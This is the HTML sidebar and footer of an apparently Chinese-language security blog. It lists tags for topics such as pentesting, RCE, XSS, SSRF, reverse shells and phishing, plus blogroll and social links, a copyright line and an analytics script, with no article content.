                <a href="https://wyb0.com/tags/oracle" title="oracle">oracle</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/pentest" title="pentest">pentest</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/php" title="php">php</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/poc" title="poc">poc</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/postgresql" title="postgresql">postgresql</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/python" title="python">python</a>
                <sup>22</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/rce" title="rce">rce</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/redis" title="redis">redis</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/server" title="server">server</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/software" title="software">software</a>
                <sup>8</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/sqlserver" title="sqlserver">sqlserver</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/ssh%e9%9a%a7%e9%81%93" title="ssh隧道">ssh隧道</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/ssrf" title="ssrf">ssrf</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/thread" title="thread">thread</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/tools" title="tools">tools</a>
                <sup>11</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/wireless" title="wireless">wireless</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/xml" title="xml">xml</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/xss" title="xss">xss</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" title="代码审计">代码审计</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="信息泄露">信息泄露</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e5%8f%8d%e5%bc%b9shell" title="反弹shell">反弹shell</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f" title="操作系统">操作系统</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" title="敏感信息泄露">敏感信息泄露</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" title="文件包含">文件包含</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e6%ad%a3%e5%88%99" title="正则">正则</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e7%88%86%e7%a0%b4" title="爆破">爆破</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e7%a4%be%e5%b7%a5" title="社工">社工</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" title="端口转发">端口转发</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e7%bd%91%e7%bb%9c%e8%ae%be%e5%a4%87" title="网络设备">网络设备</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e8%99%9a%e6%8b%9f%e6%9c%ba" title="虚拟机">虚拟机</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" title="逻辑漏洞">逻辑漏洞</a>
                <sup>2</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e9%87%8d%e5%ae%9a%e5%90%91" title="重定向">重定向</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/%e9%92%93%e9%b1%bc" title="钓鱼">钓鱼</a>
                <sup>1</sup>
            </p>
        
    </div>


</div>

            

<div style="padding-bottom:10px;">
    <h2 class="asidetitle">Links</h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="http://www.test404.com/" target="_blank">Test404's Blog</a>
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="http://zksmile.me/" target="_blank">Zksmile's Blog</a>
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="https://y-hkl.github.io/" target="_blank">Y-HKL's Blog</a>
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-link fa-fw"></i><a href="https://www.yl0.org/" target="_blank">sòng•sec</a>
        </li>
    </ul>
</div>

            
<div style="padding-bottom:10px;">
    <h2 class="asidetitle">Social</h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        <li style="list-style-type:none;">
            
                <i class="fa fa-github-square fa-fw"></i><a href="https://github.com/reber0" target="_blank">GitHub</a>
            
        </li>
        <li style="list-style-type:none;">
            
                <i class="fa fa-weibo fa-fw"></i><a href="http://weibo.com/u/5819760166" target="_blank">Weibo</a>
            
        </li>
        <li style="list-style-type:none;">
            <i class="fa fa-rss fa-fw"></i><a href="https://wyb0.com/index.xml" target="_blank">RSS</a>
        </li>
    </ul>
</div>
        </div>
    </div>

    <br><br>
    
<div class="foot">
    <div class="copyright">
        
        Copyright &copy; 2015-<script>var d=new Date();document.write(d.getFullYear());</script> Reber. All Rights Reserved.

        
        <script type="text/javascript" src="https://js.users.51.la/20938483.js"></script>
    </div>
    <script>$('.copyright img').remove();</script>
</div>
</div>

    
    <div class="goToTop">
      <a href="#top" id="goToTop">
        <img src="https://wyb0.com/img/goto_top.png" alt="可以返回顶部" title="回到顶部"/>
      </a>
    </div>

    <script src="/js/style.js"></script>

    
    

</body>
</html>
